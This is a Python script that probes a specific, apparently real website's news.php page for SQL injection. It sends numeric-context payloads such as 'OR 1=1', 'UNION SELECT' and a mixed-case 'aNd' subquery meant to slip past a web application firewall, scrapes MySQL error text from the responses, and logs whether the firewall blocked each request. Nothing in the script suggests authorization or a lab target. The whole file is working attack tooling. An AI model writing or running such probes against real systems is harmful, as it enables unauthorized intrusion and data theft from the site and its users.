#!/usr/bin/env python3
"""zagroup: test numeric injection (no quote) - c=259 might be numeric context"""
import urllib.request, re, time

UA = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)", "Accept": "*/*"}
BASE = "http://zagroup.net/news.php"

def fetch(url, timeout=12):
    try:
        req = urllib.request.Request(url, headers=UA)
        r = urllib.request.urlopen(req, timeout=timeout)
        return r.status, r.read().decode("utf-8", "ignore")
    except urllib.error.HTTPError as e:
        return e.code, e.read(5000).decode("utf-8", "ignore")
    except Exception:
        return 0, ""

def probe(param, payload, tag):
    code, body = fetch(BASE + "?c=" + param + payload)
    err = re.search(r'MySQL server error</b>\s*:\s*<br>([^<]+)', body)
    blocked = "云网盾" in body
    print("%-20s code=%s size=%d blocked=%s %s" % (tag, code, len(body), blocked,
          (err.group(1)[:100] if err else "NOERR")), flush=True)
    time.sleep(2)

print("=== numeric context tests ===")
probe("259", "-1", "num-minus")
probe("259", "+1", "num-plus")
probe("259", "259-0", "num-arithmetic")
probe("259", "259%20OR%201=1", "num-or")
probe("259", "259%20UNION%20SELECT%201", "num-union")
probe("259", "259%20AND%201=1", "num-and")
probe("259", "259%20aNd%20(select%201)=1", "num-and-subq")
# maybe parameter is id= not c=
code, body = fetch(BASE + "?id=259%27")
err = re.search(r'MySQL server error</b>\s*:\s*<br>([^<]+)', body)
print("id=259': code=%s size=%d %s" % (code, len(body), err.group(1)[:80] if err else "NOERR"), flush=True)
